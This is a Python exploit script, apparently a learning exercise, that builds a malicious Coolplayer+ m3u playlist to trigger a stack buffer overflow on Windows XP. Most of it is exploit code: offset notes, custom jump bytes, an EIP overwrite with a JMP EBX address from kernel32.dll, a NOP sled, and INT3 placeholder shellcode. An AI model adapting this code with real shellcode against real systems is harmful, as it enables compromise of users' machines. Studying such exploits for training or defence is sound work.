#!/usr/bin/python

# Author: Michael Music
# Date: 8/1/2019
# Description: Coolplayer+ Buffer Overflow Exploit
#  Exercise in BOFs following the securitysift guide
#  Tested on Windows XP
# Notes:
#  I will be assuming that EBX is the only register pointing to input buffer.
#  Since EBX points to the very beginning of the buffer, and EIP is at offset 260
#   I will need to put a JMP EBX address in EIP, then have JMP code in the beginning
#   of the buffer to JMP over the remaining junk until EIP, over EIP, over some nops
#   then into shellcode.
#  The custom JMP code will add bytes to the address in the EBX register, then jump to it.
#   This would end up be something like add [EBX] 280, JMP EBX
#  App must be installed, launched at C:/
#  m3u file must be located at C:/

# EIP at offset 260
# ESP at offset 264
# EDX at offset 0
# EBX at offset 0
# There is only around 250 bytes worth of spaces at ESP, so it's limited
# Can't fit shellcode in beginning of buffer (where EBX/EDX point), as EIP is at 260
# EBX points to much more space, around 10000 bytes
# Solution is to JMP EBX, launch custom JMP code to jump over EIP,ESP and into shellcode
# Exploit: [Custom JMP code - jump to nops][Junk][EIP - JMP EBX][nops][shellcode][Junk]
# Found a JMP EBX at 0x7c873c53 in kernel32.dll

exploit_string = ''

# Start of buffer, contains JMP code to jump 300 bytes
# Add 100 to EBX 3 times, do this to avoid using nulls if adding 300
exploit_string += '\x83\xc3\x64' * 3

# JMP EBX
exploit_string += '\xff\xe3'

exploit_string += '\x41' * (260-len(exploit_string))

# EIP, which should be an address for JMP EBX
#exploit_string += '\x42' * 4
exploit_string += '\x53\x3c\x87\x7c'

# NOP sled where the custom JMP code will land
exploit_string += '\x90' * 60

# Shellcode
exploit_string += '\xcc' * 500

# Filler to cause the overflow
exploit_string += '\x43' * (10000 - len(exploit_string))

out = 'crash.m3u'

text = open(out, 'w')
text.write(exploit_string)
text.close
